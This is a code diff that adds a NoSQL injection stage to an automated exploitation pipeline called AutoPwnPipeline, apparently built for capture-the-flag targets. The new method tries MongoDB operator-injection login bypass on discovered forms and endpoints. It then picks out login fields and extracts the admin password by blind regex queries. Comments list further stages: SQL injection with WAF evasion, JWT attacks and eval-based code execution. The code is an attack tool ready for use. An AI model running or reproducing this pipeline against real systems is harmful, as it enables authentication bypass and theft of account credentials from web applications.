@@ -41,6 +41,7 @@ from modules.deserializer import (
 from modules.client_side import ClientSideAnalyzer
 from modules.php_tricks import PHPTricksEngine
 from modules.eval_injection import EvalInjectionEngine
+from modules.nosql_injection import NoSQLInjectionEngine
 
 
 
@@ -320,20 +321,22 @@ class AutoPwnPipeline:
 
         # 5. Insecure Deserialization Probing
         self._exploit_deserialization()
+        # 6. NoSQL Injection & MongoDB Auth Bypass (Priority for Node.js/Express targets)
+        self._exploit_nosql()
 
-        # 6. SQL Injection & Auth Bypasses
+        # 7. SQL Injection & Auth Bypasses
         self._exploit_sqli()
 
-        # 7. JWT Exploitation
+        # 8. JWT Exploitation
         self._exploit_jwt()
 
-        # 8. Client-Side Cryptographic & Scrambled Binary / Image Reconstruction
+        # 9. Client-Side Cryptographic & Scrambled Binary / Image Reconstruction
         self._exploit_client_side_crypto()
 
-        # 9. PHP-Specific Logic, Type Juggling, Header Spoofing & Stream Wrappers
+        # 10. PHP-Specific Logic, Type Juggling, Header Spoofing & Stream Wrappers
         self._exploit_php_tricks()
 
-        # 10. Eval / Code Injection RCE (Python eval, Node.js eval, PHP eval)
+        # 11. Eval / Code Injection RCE (Python eval, Node.js eval, PHP eval)
         self._exploit_eval_injection()
 
 
@@ -735,6 +738,48 @@ class AutoPwnPipeline:
                         return
                 except Exception:
                     pass
+
+    def _exploit_nosql(self):
+        """Active NoSQL Injection (MongoDB $ne, $gt, $regex, $where) Auth Bypass & Data Exfiltration."""
+        nosql_success = NoSQLInjectionEngine.detect_and_exploit(
+            session=self.session,
+            target_url=self.target_url,
+            forms=self.state.get("forms", []),
+            endpoints=list(self.state.get("endpoints", [])),
+            tech_stack=self.state.get("tech_stack", []),
+            flag_checker=lambda text, ctx: self._check_and_store_flags(text, ctx),
+            state=self.state,
+        )
+        if nosql_success:
+            self._log_step("Phase 4: Exploitation", "NoSQL Injection Auth Bypass achieved")
+            self.learning_engine.record_success(
+                self.target_url, self.state["tech_stack"], "nosql_injection", "mongodb_bypass",
+                "NoSQL operator injection", list(self.state["captured_flags"])
+            )
+
+            # If no flag yet, attempt blind regex extraction of password (password may BE the flag)
+            if not self.state["captured_flags"]:
+                for form in self.state.get("forms", []):
+                    action = form.get("action", self.target_url)
+                    inputs = [i for i in form.get("inputs", []) if i.get("type") not in ["submit", "button"]]
+                    input_names = [i.get("name", "") for i in inputs]
+
+                    user_field = None
+                    pass_field = None
+                    for n in input_names:
+                        nl = n.lower()
+                        if any(k in nl for k in ["user", "login", "name", "email"]):
+                            user_field = n
+                        elif any(k in nl for k in ["pass", "pwd", "key"]):
+                            pass_field = n
+
+                    if user_field and pass_field:
+                        extracted = NoSQLInjectionEngine.extract_field_via_regex(
+                            self.session, action, user_field, pass_field, target_user="admin"
+                        )
+                        if extracted:
+                            self._check_and_store_flags(extracted, "NoSQL Blind Regex Extraction")
+                            self._check_and_store_flags(f"flag{{{extracted}}}", "NoSQL Blind Regex Extraction")
 
     def _exploit_sqli(self):
         """Active SQLi & Auth Bypass prober with database error identification and WAF evasion."""
